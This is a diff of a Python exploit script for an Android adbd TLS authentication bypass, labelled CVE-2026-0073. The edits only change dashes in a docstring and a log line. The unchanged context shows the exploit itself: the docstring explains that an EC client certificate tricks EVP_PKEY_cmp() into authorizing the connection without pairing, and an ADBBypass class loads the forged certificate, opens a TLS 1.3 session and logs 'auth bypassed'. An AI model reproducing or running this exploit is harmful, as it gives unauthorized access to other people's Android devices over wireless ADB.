@@ -1,5 +1,5 @@
 #!/usr/bin/env python3
-"""CVE-2026-0073 — Android adbd EVP_PKEY_cmp() TLS auth bypass.
+"""CVE-2026-0073 -- Android adbd EVP_PKEY_cmp() TLS auth bypass.
 A non-RSA (EC P-256) client cert makes EVP_PKEY_cmp() return -1 (truthy),
 so adbd authorizes the TLS transport without pairing. Zero-click once
 wireless ADB is on and any RSA key is already trusted."""
@@ -74,7 +74,7 @@ class ADBBypass:
             ctx.minimum_version = ctx.maximum_version = ssl.TLSVersion.TLSv1_3
             ctx.load_cert_chain(cf.name, kf.name)
             self.tls = ctx.wrap_socket(self.sock, server_hostname=self.host)
-            self._log(f"TLS {self.tls.version()} — auth bypassed")
+            self._log(f"TLS {self.tls.version()} -- auth bypassed")
         finally:
             os.unlink(cf.name); os.unlink(kf.name)
 
